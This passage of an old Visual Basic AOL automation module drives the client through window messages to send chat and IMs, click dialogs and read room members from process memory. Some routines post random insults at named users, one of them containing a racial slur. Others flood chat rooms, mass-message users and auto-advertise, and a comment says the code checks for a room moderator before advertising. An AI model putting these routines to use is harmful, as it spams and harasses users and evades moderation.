If Dis = 24 Then d$ = ", SteveCase will Email you soon!"
If Dis = 25 Then d$ = ", Youll recieve a free <OH>< soon!"
If Dis = 26 Then d$ = ", You will SMoke a Big azz Bag of weed Soon!"
If Dis = 27 Then d$ = ", You gonna get jumped sooN!"
If Dis = 28 Then d$ = ", What goes around comes Around."
If Dis = 29 Then d$ = ", Eat DeeznuTTz and Die!"
If Dis = 30 Then d$ = ", Youll realize dat DENNYs iz Predjudice!"
If Dis = 31 Then d$ = ", You'LL Buy all ECO'z Albumz!"
If Dis = 32 Then d$ = ", You'll Earn Respect from Important people!"
If Dis = 33 Then d$ = ", The Job you want, You wont Get!"
If Dis = 34 Then d$ = ", THe Job you want you Will Get!"
If Dis = 35 Then d$ = ", For some reason, You SIGN OFF soon!"
If Dis = 36 Then d$ = ", THe Sub accounT your On, will B Lozt Soon!"
If Dis = 37 Then d$ = ", A Hacker will IM you and say 'Wuzzup' Soon!"
sendchat ("<B>[<u><i>" + Person$ + d$ + "</i></u> ]")
TimeOut (0.3)
End If
End If
End Sub


Sub Bot_WhiTe(Person$)
If Person$ = "OnlineHost" Then Exit Sub
    If Person$ = getuser Then Exit Sub
    Dim Dis
    Randomize
    Dis = Int(22 * Rnd + 1)
If Dis = 1 Then d$ = "If you have screens in all your windows"
If Dis = 2 Then d$ = "If your windows open 10 different wayz 4 e z cleaning"
If Dis = 3 Then d$ = "If your parentz iz still 2geva"
If Dis = 4 Then d$ = "If you have 2 washer'z and dryer'z"
If Dis = 5 Then d$ = "If you are getting mad at diz bot"
If Dis = 6 Then d$ = "If you have a car dat no1 drivez"
If Dis = 7 Then d$ = "If you have a sittin room dat no1 sitz in"
If Dis = 8 Then d$ = "If you have da best computer known to man"
If Dis = 9 Then d$ = "If you have a ashtray on every table"
If Dis = 10 Then d$ = "If your car iz alwayz clean ""Professionally"""
If Dis = 11 Then d$ = "If you got on tight white drawlz"
If Dis = 12 Then d$ = "If you still lizten to ""Whoop there it iz"""
If Dis = 13 Then d$ = "If you like watching Mash"
If Dis = 14 Then d$ = "If you gotta automatic Ice Maker"
If Dis = 15 Then d$ = "If All your food sayz Value Pack on it"
If Dis = 16 Then d$ = "If You never heard uv Econ,Thorafare, or Richfood"
If Dis = 17 Then d$ = "If Your Bathroom has Popuri in it"
If Dis = 18 Then d$ = "If You got Name brand toilet paper"
If Dis = 19 Then d$ = "If you are mad at me cuz i am illiterate"
If Dis = 20 Then d$ = "If you constantly say da werd ""Nigger"""
If Dis = 21 Then d$ = "If you gotta little dick"
If Dis = 22 Then d$ = "If you gotta extra bottle uv Ketchup in yo Cabnit"
If Dis = 23 Then d$ = ""
If Dis = 24 Then d$ = ""
If Dis = 25 Then d$ = ""
If Dis = 26 Then d$ = ""
If Dis = 27 Then d$ = ""
If Dis = 28 Then d$ = ""
If Dis = 29 Then d$ = ""
If Dis = 30 Then d$ = ""
If Dis = 31 Then d$ = ""
If Dis = 32 Then d$ = ""
If Dis = 33 Then d$ = ""

sendchat ("[-<B><u>" + Person$ + "</b>,<i></u> " + d$ + ", You might b white</i>!-]")
TimeOut (0.5)


End Sub






























Sub Click_Connect_BELL()
OKw = FindWindow("#32770", "Connect To")
If proG_STAT$ = "OFF" Then Exit Sub
okb = FindChildByTitle(OKw, "Connect")
okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
End Sub

Sub Click_BUtTon(caption, buttun As String)
OKw = FindWindow("#32770", caption)
If proG_STAT$ = "OFF" Then Exit Sub
okb = FindChildByTitle(OKw, buttun$)
okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
End Sub
Sub ClicK_iT(caption, Button As String)
OKw = FindWindow("#32770", caption)
If proG_STAT$ = "OFF" Then Exit Sub
okb = FindChildByTitle(OKw, Button$)
okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
End Sub
Sub ClicK_YeS(caption)
OKw = FindWindow("#32770", caption)
If proG_STAT$ = "OFF" Then Exit Sub
okb = FindChildByTitle(OKw, "Yes")
okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
End Sub

Sub ClicK_NO(caption)
OKw = FindWindow("#32770", caption)
If proG_STAT$ = "OFF" Then Exit Sub
okb = FindChildByTitle(OKw, "No")
okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
End Sub
Sub ClicK_OK(caption)
OKw = FindWindow("#32770", caption)
If proG_STAT$ = "OFF" Then Exit Sub
okb = FindChildByTitle(OKw, "OK")
okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
End Sub

Sub CLickPEOPLE()
tool% = FindChildByClass(AOLWindow(), "AOL Toolbar")
Toolbar% = FindChildByClass(tool%, "_AOL_Toolbar")
icon% = FindChildByClass(Toolbar%, "_AOL_Icon")
icon% = GetWindow(icon%, GW_HWNDNEXT)
icon% = GetWindow(icon%, GW_HWNDNEXT)
icon% = GetWindow(icon%, GW_HWNDNEXT)
icon% = GetWindow(icon%, GW_HWNDNEXT)
icon% = GetWindow(icon%, GW_HWNDNEXT)
icon% = GetWindow(icon%, GW_HWNDNEXT)
icon% = GetWindow(icon%, GW_HWNDNEXT)
icon% = GetWindow(icon%, GW_HWNDNEXT)
icon% = GetWindow(icon%, GW_HWNDNEXT)
Call cLickiCoN(icon%)


End Sub
Function SNfromIM()
'bet it aint me >:/

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient") '

IM% = FindChildByTitle(MDI%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(MDI%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
IMCap$ = getcaption(IM%)
thesn$ = Mid(IMCap$, InStr(IMCap$, ":") + 2)
SNfromIM = thesn$

End Function
Sub RespondIM(message)

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")

IM% = FindChildByTitle(MDI%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(MDI%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Sub
Greed:
e = FindChildByClass(IM%, "RICHCNTL")

e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)


e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e2 = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e2, GW_HWNDNEXT)
Call SendMessageByString(e2, WM_SETTEXT, 0, message)
cLickiCoN (e)
Call TimeOut(0.8)
IM% = FindChildByTitle(MDI%, "  Instant Message From:")
e = FindChildByClass(IM%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
cLickiCoN (e)
Call AOL4_KillWin(IM%)
End Sub


Function MessageFromIM()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")

IM% = FindChildByTitle(MDI%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(MDI%, "  Instant Message To: " + getuser)
If IM% Then GoTo Greed
Exit Function
Greed:
IMText% = FindChildByClass(IM%, "RICHCNTL")
IMmessage = gettext(IMText%)
sn = SNfromIM()
snlen = Len(SNfromIM()) + 3
blah = Mid(IMmessage, InStr(IMmessagge, sn) + snlen)
TimeOut (0.1)
On Error Resume Next
MessageFromIM = Left(blah, Len(blah) - 1)
End Function

Sub BoldSendChat(BoldChat)
sendchat ("<font face=arial><b>" & BoldChat & "</b>")
End Sub
Sub AOLRunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer
AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLitemid = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, AOLitemid, 0&)
End Sub
Function AolMdi()
AOL% = FindWindow("AOL Frame25", vbNullString)
AolMdi = FindChildByClass(AOL%, "MDIClient")
End Function
Function NetscapeMDI()
nscape% = FindWindow("Afx: 400000:b:14d6:6:388f", vbNullString)
NetscapeMDI = FindChildByClass(nscape%, "Afx:400000:3028")
End Function

Function WindowSPY(winhdl As TextBox, winclass As TextBox, wintxt As TextBox, winstyle As TextBox, winidnum As TextBox, winphandle As TextBox, winptext As TextBox, winpclass As TextBox, winmodule As TextBox)
Dim pt32 As POINTAPI, ptx As Long, pty As Long, swindowtext As String * 100
Dim sclassname As String * 100, hwndover As Long, hWndParent As Long
Dim sparentclassname As String * 100, wID As Long, lwindowstyle As Long
Dim hInstance As Long, sparentwindowtext As String * 100
Dim smodulefilename As String * 100, r As Long
Static hwndlast As Long
    Call GetCursorPos(pt32)
    ptx = pt32.X
    pty = pt32.Y
    hwndover = WindowFromPointXY(ptx, pty)
    If hwndover <> hwndlast Then
        hwndlast = hwndover
        winhdl.Text = "Window Handle: " & hwndover
        r = GetWindowText(hwndover, swindowtext, 100)
        wintxt.Text = "Window Text: " & Left(swindowtext, r)
        r = GetClassName(hwndover, sclassname, 100)
        winclass.Text = "Window Clazz Name: " & Left(sclassname, r)
        lwindowstyle = GetWindowLong(hwndover, GWL_STYLE)
        winstyle.Text = "Window Style: " & lwindowstyle
        hWndParent = GetParent(hwndover)
            If hWndParent <> 0 Then
                wID = GetWindowWord(hwndover, GWW_ID)
                winidnum.Text = "Window ID Numba: " & wID
                winphandle.Text = "Parent Window Handle: " & hWndParent
                r = GetWindowText(hWndParent, sparentwindowtext, 100)
                winptext.Text = "Parent Window Text: " & Left(sparentwindowtext, r)
                r = GetClassName(hWndParent, sparentclassname, 100)
                winpclass.Text = "Parent Window Clazz Name: " & Left(sparentclassname, r)
            Else
                winidnum.Text = "Window ID Number: N/A"
                winphandle.Text = "Parent Window Handle: N/A"
                winptext.Text = "Parent Window Text : N/A"
                winpclass.Text = "Parent Window Clazz Name: N/A"
            End If
                hInstance = GetWindowWord(hwndover, GWW_HINSTANCE)
                r = GetModuleFileName(hInstance, smodulefilename, 100)
        winmodule.Text = "Module: " & Left(smodulefilename, r)
    End If
End Function
Function WindowSPY_2(winhdl As TextBox, winclass As TextBox, wintxt As TextBox, winstyle As TextBox, winidnum As TextBox, winphandle As TextBox, winptext As TextBox, winpclass As TextBox, winmodule As TextBox)
Dim pt32 As POINTAPI, ptx As Long, pty As Long, swindowtext As String * 100
Dim sclassname As String * 100, hwndover As Long, hWndParent As Long
Dim sparentclassname As String * 100, wID As Long, lwindowstyle As Long
Dim hInstance As Long, sparentwindowtext As String * 100
Dim smodulefilename As String * 100, r As Long
Static hwndlast As Long
    Call GetCursorPos(pt32)
    ptx = pt32.X
    pty = pt32.Y
    hwndover = WindowFromPointXY(ptx, pty)
    If hwndover <> hwndlast Then
        hwndlast = hwndover
        winhdl.Text = hwndover
        r = GetWindowText(hwndover, swindowtext, 100)
        wintxt.Text = Left(swindowtext, r)
        r = GetClassName(hwndover, sclassname, 100)
        winclass.Text = Left(sclassname, r)
        lwindowstyle = GetWindowLong(hwndover, GWL_STYLE)
        winstyle.Text = lwindowstyle
        hWndParent = GetParent(hwndover)
            If hWndParent <> 0 Then
                wID = GetWindowWord(hwndover, GWW_ID)
                winidnum.Text = wID
                winphandle.Text = hWndParent
                r = GetWindowText(hWndParent, sparentwindowtext, 100)
                winptext.Text = Left(sparentwindowtext, r)
                r = GetClassName(hWndParent, sparentclassname, 100)
                winpclass.Text = Left(sparentclassname, r)
            Else
                winidnum.Text = ""
                winphandle.Text = ""
                winptext.Text = ""
                winpclass.Text = ""
            End If
                hInstance = GetWindowWord(hwndover, GWW_HINSTANCE)
                r = GetModuleFileName(hInstance, smodulefilename, 100)
        winmodule.Text = Left(smodulefilename, r)
    End If
End Function






Sub IMKeyword(Recipiant, message)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Call XAOL4_Keyword("aol://9293:")
Do: DoEvents
imwin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(imwin%, "_AOL_Edit")
AORich% = FindChildByClass(imwin%, "RICHCNTL")
AOIcon% = FindChildByClass(imwin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)
For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X
Call TimeOut(0.01)
cLickiCoN (AOIcon%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
imwin% = FindChildByTitle(MDI%, "Send Instant Message")
okwin% = FindWindow("#32770", "America Online")
If okwin% <> 0 Then Call SendMessage(okwin%, WM_CLOSE, 0, 0): closer2 = SendMessage(imwin%, WM_CLOSE, 0, 0): Exit Do
If imwin% = 0 Then Exit Do
Loop
End Sub


Sub sendim(Recipiant, message)
'da wopztuh made me fo0
If AOL_VerzioN = 2 Then Call AOL25_sendim(Recipiant, message): Exit Sub
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Call XAOL4_Keyword("aol://9293:")
Do: DoEvents
imwin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(imwin%, "_AOL_Edit")
AORich% = FindChildByClass(imwin%, "RICHCNTL")
AOIcon% = FindChildByClass(imwin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Do
DoEvents:
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)
Loop Until gettext(AORich%) = message
For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X
Call TimeOut(0.02)
cLickiCoN (AOIcon%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
imwin% = FindChildByTitle(MDI%, "Send Instant Message")
okwin% = FindWindow("#32770", "America Online")
If okwin% <> 0 Then Call SendMessage(okwin%, WM_CLOSE, 0, 0): closer2 = SendMessage(imwin%, WM_CLOSE, 0, 0): Exit Do
If imwin% = 0 Then Exit Do
Loop

End Sub
Sub cLickiCoN(icon%)
Click% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Click% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub CenterForm(f As Form)
f.top = (Screen.Height * 0.85) / 2 - f.Height / 2
f.Left = Screen.Width / 2 - f.Width / 2
End Sub
Sub RunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)

For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)

For getString = 0 To MenuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, getString)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)

If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = SubCount%
GoTo MatchString
End If

Next getString

Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub

Sub TimeOut(Duration)
If INI_GeT("Settingz", "oh", App.Path + "\uzer.ini") = "1" Then Exit Sub


starttime = Timer
Do While Timer - starttime < Duration

DoEvents
Loop

End Sub
Sub sendchat(chat)
If INI_GeT("Settingz", "oh", App.Path + "\uzer.ini") = "1" Then SendChat_Quicker (chat): Exit Sub
'[ouwop]
'incase therez text in the sendchat box, it holdz it
'then sendz your text
'then re-setz the original text
'and if itz to long or complex, it automatically clickz OK
'if findz da aol25 chatroom it sendz to it + removez htmL
'debugz itself incase AOL chanhgez da ro0mz again
'and checkz for a guide in room before advertizing
'and free'z the compz memery incase laggin or slow  >;]
If INI_GeT("mazta", "aim", App.Path + "\uzer.ini") = "1" Then If AIM_IsOnline Then AIM_SendChat (chat)
If INI_GeT("Settingz", "chk", "C:\windows\uzer.ini") = "yez" Then If Guide_Check = 1 Then If MsgBox("To De-Activate thiz Message From" + Chr(10) + "Appearing, Goto File- Configuration" + Chr(10) + Chr(10) + "Send Text:" + Chr(10) + Chr(10) + Remove_HTML(chat) + Chr(10) + Chr(10) + "to chat room anyway?", vbCritical + vbYesNo, "Guide Found!") = vbYes Then GoTo rezumE Else Exit Sub
rezumE:
'If InStr(LCase(chat), LCase("<font")) Then chat = chat Else chat = "<font style=ARIAL>" & chat
Dim ch As String
ch$ = chat
If AOL_VerzioN = 2 Then Call AOL25_SendchaT(Remove_HTML(chat)): Exit Sub
If AOL_VerzioN = 3 Then Call AOL25_SendchaT(Remove_HTML(chat)): Exit Sub
If INI_GeT("Settingz", "html", App.Path + "\uzer.ini") = "yez" Then chat = Remove_HTML(chat)
room& = FindRoom
AORich& = FindChildByClass(room&, "RICHCNTL")
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich2& = GetWindow(AORich&, 2)
AORich3& = GetWindow(AORich2&, 2)
AORich4& = GetWindow(AORich3&, 2)
AORich5& = GetWindow(AORich4&, 2)
''
Call ClicK_OK("America Online")
OLD = gettext(AORich&)
Call SendMessageByString(AORich&, WM_SETTEXT, 0, "")
Call SendMessageByString(AORich&, WM_SETTEXT, 0, chat)
Call SendMessageByNum(AORich&, WM_CHAR, 13, 0)
''
OLD = gettext(AORich2&)
Call SendMessageByString(AORich2&, WM_SETTEXT, 0, "")
Call SendMessageByString(AORich2&, WM_SETTEXT, 0, chat)
Call SendMessageByNum(AORich2&, WM_CHAR, 13, 0)
''
OLD = gettext(AORich3&)
Call SendMessageByString(AORich3&, WM_SETTEXT, 0, "")
Call SendMessageByString(AORich3&, WM_SETTEXT, 0, chat)
Call SendMessageByNum(AORich3&, WM_CHAR, 13, 0)
''
OLD = gettext(AORich4&)
Call SendMessageByString(AORich4&, WM_SETTEXT, 0, "")
Call SendMessageByString(AORich4&, WM_SETTEXT, 0, chat)
Call SendMessageByNum(AORich4&, WM_CHAR, 13, 0)
''
'OLD = gettext(AORich5&)
'Call SendMessageByString(AORich5&, WM_SETTEXT, 0, "")
'Call SendMessageByString(AORich5&, WM_SETTEXT, 0, chat)
'Call SendMessageByNum(AORich5&, WM_CHAR, 13, 0)
''
OKw = FindWindow("#32770", "America Online")
okb = FindChildByTitle(OKw, "OK")
If OKw Then Call ClicK_OK("America Online")
TimeOut (0.000000000001)
Call SendMessageByString(AORich&, WM_SETTEXT, 0, OLD)
Call SendMessageByString(AORich2&, WM_SETTEXT, 0, OLD)
Call SendMessageByString(AORich3&, WM_SETTEXT, 0, OLD)
Call SendMessageByString(AORich4&, WM_SETTEXT, 0, OLD)
Call SendMessageByString(AORich5&, WM_SETTEXT, 0, OLD)
'FreeProcess
Call ClicK_OK("America Online")

End Sub
Sub ClearChatText()
'[ouwop]
TimeOut (2)
htt = """"
a$ = "<font color=" + htt + "#fffffe" + htt + ">!<pre= IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI"
b$ = " IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI IXI O</b>uwopz ‹v›az<b>†</b>a <B>P</b>rogg"
sendchat a$ & b$
sendchat a$ & b$
sendchat a$ & b$
sendchat a$ & b$
Dim ch As String
ch$ = chat
room& = FindRoom
AORich& = FindChildByClass(room&, "RICHCNTL")
Call SetText(AORich&, "")
End Sub
Sub SendChat_Quicker(chat)
'ouwop
'Dont reset old txt for quicker send
If AOL_VerzioN = 2 Then Call AOL25_SendchaT(Remove_HTML(chat)): Exit Sub
If AOL_VerzioN = 3 Then Call AOL25_SendchaT(Remove_HTML(chat)): Exit Sub
Call ClicK_OK("America Online")
room& = findChatRoom
AORich& = FindChildByClass(room&, "RICHCNTL")
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
AORich& = GetWindow(AORich&, 2)
Call SendMessageByString(AORich&, WM_SETTEXT, 0, chat)
Call SendMessageByNum(AORich&, WM_CHAR, 13, 0)
End Sub

Sub sendchat2(chat)
'ouwop
'sendzchat in random color
Call sendchat("<Font color=#" + RandomColor + ">" & chat)
End Sub

Sub Ouwop_LiNK(url$, description$)
''Getz text from the Box u type in chat
''Holdz it
''Send your link
''Then re-Putz the old text into the box

'Uzed this in a timer for a auto link to your WWW
'keep in mind da INTERVAL, good set on 60000


room% = findChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

FF$ = gettext(AORich%)

Call SendMessageByString(AORich%, WM_SETTEXT, 0, "")
TimeOut (0.1)
BoldSendChat "< a href=" & url$ & ">" & description$ & "</a>"

Call SetFocusAPI(AORich%)

Call SendMessageByString(AORich%, WM_SETTEXT, 0, FF$)


End Sub




Sub IMsOn()
If IsUserOnline Then
Call sendim("$IM_ON", "Ouwop Iz Da BomB")
Else
Exit Sub
End If
'MAXIMIZE_CHAT
End Sub
Sub IMsOff()
If IsUserOnline Then
Call sendim("$IM_OFF", "Ouwop iz Da BOMB")
Else
Exit Sub
End If
'MAXIMIZE_CHAT
End Sub
Sub AOL4_SetText(win, txt$)
TheText% = SendMessageByString(win, WM_SETTEXT, 0, txt$)
End Sub
Sub AOL4_KillWin(windo)
CloseTheMofo = SendMessageByNum(windo, WM_CLOSE, 0, 0)
End Sub

Sub AOL4_Invite(Person$)
'''Ouwop
FreeProcess
On Error GoTo peace
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Bud% = FindChildByTitle(MDI%, "Buddy List Window")
aa = FindChildByClass(Bud%, "_AOL_Icon")
aa = GetWindow(e, GW_HWNDNEXT)
aa = GetWindow(e, GW_HWNDNEXT)
aa = GetWindow(e, GW_HWNDNEXT)
aa = GetWindow(e, GW_HWNDNEXT)
aa = GetWindow(e, GW_HWNDNEXT)
aa = GetWindow(e, GW_HWNDNEXT)
cLickiCoN (aa)
TimeOut (1#)
chat% = FindChildByTitle(MDI%, "Buddy Chat")
AolEdit% = FindChildByClass(chat%, "_AOL_Edit")
If chat% Then GoTo PUTT
PUTT:
Call AOL4_SetText(AolEdit%, Person$)
da = FindChildByClass(chat%, "_AOL_Icon")
cLickiCoN (da)
buhBye% = FindChildByTitle(MDI%, "Invitation From:")
Call AOL4_KillWin(buhBye%)
FreeProcess
peace:
Exit Sub
End Sub


Sub AOLChangeCaption(NewCaption As String)
Call AOLSetText(AOLWindow(), NewCaption)
End Sub

Sub AOLSetText(win, txt)
TheText% = SendMessageByString(win, WM_SETTEXT, 0, txt)
End Sub
Sub XAOL4_SignOff()
Call AOL40CloseChat
TimeOut (0.2)
Call AOL40CloseChat
TimeOut (0.2)
Call AOL40CloseChat
Call runaolmenu(3&, 1&)
End Sub

Sub ShowSignOn()
'ouwop
If AOL_VerzioN = 4 Then
doiTTT:
Call runaolmenu(3&, 0&)
ElseIf AOL_VerzioN = 5 Then: GoTo doiTTT
Else

End If

End Sub

Sub AOL25_ShowSignOn()
If AOL_VerzioN = 2 Then
Call runaolmenu(2&, 0&)
Else
End If
End Sub

Sub AOLUK_ShowSignOn()
If AOL_VerzioN = 3 Then
Call runaolmenu(2&, 0&)
Else
End If
End Sub


Sub AOLRunMenuByString(stringer As String)
Call RunMenuByString(AOLWindow(), stringer)
End Sub

Sub AOL40_ReadMail()
tool% = FindChildByClass(AOLWindow(), "AOL Toolbar")
Toolbar% = FindChildByClass(tool%, "_AOL_Toolbar")
icon% = FindChildByClass(Toolbar%, "_AOL_Icon")
Call cLickiCoN(icon%)
End Sub

Sub AddRoomToListbox(ListBox As ListBox)
If AOL_VerzioN = 2 Then Call AOL25_Addroom(ListBox): Exit Sub
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
room = findChatRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = getuser Then GoTo na
ListBox.AddItem (Person$)
na:
Next Index
Call CloseHandle(AOLProcessThread)
End If

End Sub
Sub Mass_IM_PR(s As Label)
'ouwop
's = the stop label
